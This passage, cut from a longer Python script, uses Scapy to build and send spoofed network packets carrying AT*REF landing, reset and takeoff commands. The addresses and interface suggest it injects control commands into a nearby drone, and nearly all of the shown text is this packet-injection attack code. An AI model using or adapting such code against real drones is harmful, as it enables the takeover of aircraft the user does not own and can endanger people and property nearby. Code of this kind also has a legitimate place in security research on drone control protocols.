...
landing = "AT*REF=1000000,290717696\r" # Landing


reset = "AT*REF=1,290717696\r" # Reset by sending 1 as sequence Number

takeoff_packet = Ether(src=srcMAC, dst=dstMAC) / IP(src=srcIP, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / takeoff
print  takeoff
sendp(takeoff_packet, iface="wlp3s0")
